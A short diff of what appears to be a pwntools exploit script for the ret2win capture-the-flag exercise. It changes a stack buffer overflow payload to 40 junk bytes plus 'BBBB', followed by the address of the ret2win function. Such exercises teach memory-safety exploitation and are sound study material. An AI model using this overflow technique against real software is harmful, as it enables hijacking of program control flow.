@@ -18,7 +18,7 @@ else:
 p.recvuntil("> ")
 
 # 44 byte junk, replace esp with ret2win()
-payload = b"A" * 44 + pwn.pack(elf.sym['ret2win'])
+payload = b"A" * 40 + b"BBBB" + pwn.pack(elf.sym['ret2win'])
 p.sendline(payload)
 
 
